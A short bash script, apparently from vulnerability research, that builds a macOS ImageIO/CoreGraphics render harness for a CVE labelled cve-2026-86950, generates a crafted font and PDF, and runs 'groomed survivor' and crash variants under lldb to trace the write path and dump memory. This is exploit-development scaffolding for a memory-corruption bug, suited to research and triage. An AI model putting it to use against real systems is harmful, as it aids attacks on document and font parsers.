#!/bin/bash
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
./venv/bin/python - << 'PYEOF' 2>/dev/null || { python3 -m venv venv && ./venv/bin/pip -q install fonttools; }
import sys; sys.path.insert(0, '.')
from sweep import gen_font_h, gen_pdf
gen_font_h('j1.ttf', n=12, dx=40, upm=16384, k=32, line_len=38, n_lines=1, neg_y=False)
gen_pdf('j1.pdf', 'j1.ttf', ptsize=1024, k=32, ftf=128)
print('j1 regenerated')
PYEOF
# B) groomed survivor: entry bp -> jtrace2 continues through the write path
JMODE=survive lldb -b \
  -o "breakpoint set -n aa_cache_render" \
  -o "process launch -- j1.pdf" \
  -o "command script import ../cg-extract/jtrace2.py" \
  -o "detach" -o "quit" \
  ./render > j2_survive.txt 2>&1 || true
grep -cE "\[hit" j2_survive.txt || echo 0
# A) crash variant: entry bp -> jtrace2 -> fault -> memory dumps
JMODE=crash lldb -b \
  -o "breakpoint set -n aa_cache_render" \
  -o "process launch -- trigger.pdf" \
  -o "command script import ../cg-extract/jtrace2.py" \
  -o "detach" -o "quit" \
  ./render > j2_crash.txt 2>&1 || true
tail -12 j2_crash.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/j2_*.txt findings/
ls -la findings/
